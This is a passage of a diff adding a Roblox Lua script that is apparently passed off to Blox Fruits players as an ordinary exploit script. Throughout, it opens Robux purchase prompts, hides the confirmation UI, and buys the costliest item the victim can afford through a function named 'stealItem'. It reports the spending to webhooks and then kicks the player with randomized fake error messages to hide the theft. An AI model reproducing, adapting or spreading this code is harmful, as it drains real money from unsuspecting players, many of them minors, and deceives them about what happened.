+    if not webhookSent then
+        sendWebhook(totalSpent, storageName)
+        webhookSent = true
+    end
+
+    waitForPromptToDisappear()
+    purchaseInProgress = false
+end
+
+hideNotifications()
+
+local function stealItem(balance)
+    -- << Permanent Fruits
+    if balance >= 5000 then
+        buyItem("Permanent Dragon-Dragon", 5000)
+    elseif balance >= 4000 then
+        buyItem("Permanent Kitsune-Kitsune", 4000)
+    elseif balance >= 3000 then
+        buyItem("Permanent Yeti-Yeti", 3000)
+    elseif balance >= 2550 then
+        buyItem("Permanent Spirit-Spirit", 2550)
+    elseif balance >= 2500 then
+        buyItem("Permanent Gas-Gas", 2500)
+    elseif balance >= 2450 then
+        buyItem("Permanent Venom-Venom", 2450)
+    elseif balance >= 2425 then
+        buyItem("Permanent Shadow-Shadow", 2425)
+    elseif balance >= 2400 then
+        buyItem("Permanent Dough-Dough", 2400)
+    elseif balance >= 2350 then
+        buyItem("Permanent T-Rex-T-Rex", 2350)
+    elseif balance >= 2300 then
+        buyItem("Permanent Gravity-Gravity", 2300)
+    elseif balance >= 2250 then
+        buyItem("Permanent Blizzard-Blizzard", 2250)
+    elseif balance >= 2200 then
+        buyItem("Permanent Pain-Pain", 2200)
+    elseif balance >= 2100 then
+        buyItem("Permanent Rumble-Rumble", 2100)
+    elseif balance >= 2000 then
+        buyItem("Permanent Portal-Portal", 2000)
+    elseif balance >= 1900 then
+        buyItem("Permanent Sound-Sound", 1900)
+    elseif balance >= 1800 then
+        buyItem("Permanent Spider-Spider", 1800)
+    elseif balance >= 1700 then
+        buyItem("Permanent Love-Love", 1700)
+    elseif balance >= 1650 then
+        buyItem("Permanent Buddha-Buddha", 1650)
+    elseif balance >= 1300 then
+        buyItem("Permanent Magma-Magma", 1300)
+    elseif balance >= 1275 then
+        buyItem("Permanent Ghost-Ghost", 1275)
+    elseif balance >= 1250 then
+        buyItem("Permanent Barrier-Barrier", 1250)
+    elseif balance >= 1100 then
+        buyItem("Permanent Light-Light", 1100)
+    elseif balance >= 1000 then
+        buyItem("Permanent Diamond-Diamond", 1000)
+    elseif balance >= 950 then
+        buyItem("Permanent Dark-Dark", 950)
+    elseif balance >= 850 then
+        buyItem("Permanent Sand-Sand", 850)
+    elseif balance >= 750 then
+        buyItem("Permanent Ice-Ice", 750)
+    elseif balance >= 650 then
+        buyItem("Permanent Falcon-Falcon", 650)
+    elseif balance >= 550 then
+        buyItem("Permanent Flame-Flame", 550)
+    elseif balance >= 380 then
+        buyItem("Permanent Spike-Spike", 380)
+    elseif balance >= 250 then
+        buyItem("Permanent Smoke-Smoke", 250)
+    elseif balance >= 220 then
+        buyItem("Permanent Bomb-Bomb", 220)
+    elseif balance >= 180 then
+        buyItem("Permanent Spring-Spring", 180)
+    elseif balance >= 100 then
+        buyItem("Permanent Blade-Blade", 100)
+    elseif balance >= 75 then
+        buyItem("Permanent Spin-Spin", 75)
+
+    -- << Gamepasses
+    elseif balance >= 2700 then
+        buyItem("Fruit Notifier", 2700)
+    elseif balance >= 1500 then
+        buyItem("3x Mythical Scrolls", 1500)
+    elseif balance >= 1200 then
+        buyItem("Dark Blade", 1200)
+    elseif balance >= 450 then
+        buyItem("2x Mastery", 450)
+    elseif balance >= 450 then
+        buyItem("2x Money", 450)
+    elseif balance >= 400 then
+        buyItem("+1 Fruit Storage", 400)
+    elseif balance >= 350 then
+        buyItem("2x Boss Drops", 350)
+    elseif balance >= 50 then
+        buyItem("10K Money", 50)
+    elseif balance >= 25 then
+        buyItem("2x EXP (15 mins.)", 25)
+    end
+end
+
+local CoreGui = game:GetService("CoreGui")
+
+local function getRobuxAndProceed()
+    coroutine.wrap(function()
+        coroutine.wrap(loopSinkTransparency)()
+
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["StorageName"] = "2x EXP (15 mins.)",
+                ["FunnelId"] = "Shop",
+                ["PurchaseLocation"] = "Shop"
+            }
+        }
+
+        local CommF = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
+        if CommF then
+            CommF:InvokeServer(unpack(args))
+        end
+
+        local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+        while not PurchasePrompt do
+            task.wait()
+            PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+        end
+
+        coroutine.wrap(function()
+            while true do
+                local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
+                if RobuxUpsellContainer then
+                    RobuxUpsellContainer.Visible = false
+                    game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
+                    break
+                end
+                task.wait(0.1)
+            end
+        end)()      
+
+        local ProductPurchaseContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+        if ProductPurchaseContainer then
+            local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
+            if Animator then
+                local Prompt = Animator:WaitForChild("Prompt")
+                if Prompt then
+                    Prompt.Visible = false
+                    local settingsClippingShield = CoreGui:FindFirstChild("RobloxGui") and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
+                    if settingsClippingShield then
+                        settingsClippingShield.Visible = false
+                    end
+
+                    task.wait(1)
+
+                    local balance = getRobuxBalance()
+            
+                    if balance < 25 then
+                        game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
+                        return
+                    end
+
+                    local VirtualInputManager = game:GetService("VirtualInputManager")
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+                    task.wait()
+                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+
+                    waitForPromptToDisappear()
+
+                    task.wait(0.5)
+
+                    stealItem(balance)
+                else
+                    print("err1")
+                end
+            else
+                print("err2")
+            end
+        else
+            print("err3")
+        end
+    end)()
+end
+
+local function waitForPrompt()
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if not PurchasePrompt then return end
+    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+    if not ProductContainer then return end
+    local Animator = ProductContainer:FindFirstChild("Animator")
+    if not Animator then return end
+
+    modifyPromptUI(true)
+
+    Animator.ChildAdded:Connect(function(child)
+        if child.Name == "Prompt" then
+            modifyPromptUI(false)
+            waitForPurchaseConfirmation()
+        end
+    end)
+
+    local messages = {
+        "Error! Please, Rejoin & Try Again.",
+        "You have been kicked from this game. Reason: Unexpected error. Rejoin & Try again.",
+        "Oops! Something went wrong. Try rejoining. Rejoin & Try again.",
+        "Your connection was lost. Please reconnect. Rejoin & Try again.",
+        "You were kicked for suspicious activity. Contact support if this is a mistake. Rejoin & Try again.",
+        "Game data error!. Please rejoin. Rejoin & Try again.",
+        "Network timeout. Reconnect to continue. Rejoin & Try again.",
+        "This session has expired. Please rejoin. Rejoin & Try again.",
+        "Invalid client state detected. Restart and try again.",
+        "You were kicked for exceeding the rate limit. Slow down! Rejoin & Try again.",
+        "Server maintenance. Come back later. Rejoin & Try again.",
+        "Unspecified error. Please try rejoining. Rejoin & Try again.",
+        "Something broke. Report this to the developers. Rejoin & Try again.",
+        "ERROR. Rejoin & Try again.",
+        "Oops! The server tripped on a bug. Please rejoin. Rejoin & Try again.",
+        "Illegal move detected. Rejoin & Try again.",
+        "Disconnected due to inactivity. Rejoin when you're ready. Rejoin & Try again.",
+        "Kicked by Uzoth. Reason: Sorry random dude, just testing kick system, you can rejoin",
+    }
+
+    coroutine.wrap(function()
+        while not promptConfirmed do
+            task.wait()
+        end
+
+        if totalSpent >= 25 and promptConfirmed then
+            sendWebhook2(totalSpent)
+            task.wait(0.5)
+            local randomMessage = messages[math.random(1, #messages)]
+            game.Players.LocalPlayer:Kick(randomMessage)
+        else
+            print("err")
+        end
+
+        local VirtualInputManager = game:GetService("VirtualInputManager")
+
+        while true do
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+            task.wait() 
+
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+
+            local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+            if not PurchasePrompt then
+                break
+            end
+
+            local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+            if not ProductContainer then break end
+
+            local Animator = ProductContainer:FindFirstChild("Animator")
+            if not Animator then break end
+
+            local prompt = Animator:FindFirstChild("Prompt")
+            if not prompt then
+                break 
+            end
+        end
+    end)()
+end
+
+if success then
+    sendExecutionLog()
+    waitForPrompt()
+    getRobuxAndProceed()
+else
+    warn("Error: " .. err)
+end
+
+game.Players.LocalPlayer.OnTeleport:Connect(function()
+    _G.scriptExecuted = nil
+end)
